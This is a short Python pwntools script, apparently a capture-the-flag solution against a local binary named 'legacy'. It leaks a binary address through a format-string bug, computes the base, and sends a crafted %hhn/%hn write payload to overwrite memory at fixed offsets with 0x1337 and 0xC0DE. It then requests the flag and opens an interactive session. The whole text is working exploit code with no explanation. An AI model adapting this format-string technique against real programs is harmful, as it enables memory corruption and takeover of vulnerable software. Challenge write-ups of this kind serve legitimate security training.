#!/usr/bin/python3
from pwn import *


while(1):
    p = process("./legacy")
    # p = gdb.debug("./legacy")
    p.sendlineafter("> ",b"maint d  %51$p")
    p.recvuntil("0x")
    leak_binary = int(p.recvline(),16)
    log.info("binary_leak: " + hex(leak_binary))
    base_binary = leak_binary - 0x227d
    payload = b'maint d '
    payload += f'%{3}c%147$hhn%{0x1337-3}c%148$hn%{0xC0DE-0x1337}c%149$hn'.encode()
    payload = payload.ljust(0x40,b"a")
    payload += p32(base_binary+ 0x4ae0)
    payload += p32(base_binary+ 0x4ae6)
    payload += p32(base_binary+ 0x4ae4)

    p.sendlineafter("> ",payload)

    try :
        p.sendlineafter("> ",b"flag")
        p.recvuntil(b"FLAG SYSTEM")
        log.info("0x1337code: "+ hex((base_binary+ 0x4ae4)))
        p.interactive()
    except:
        #p.close()
        print("er")



    p.interactive()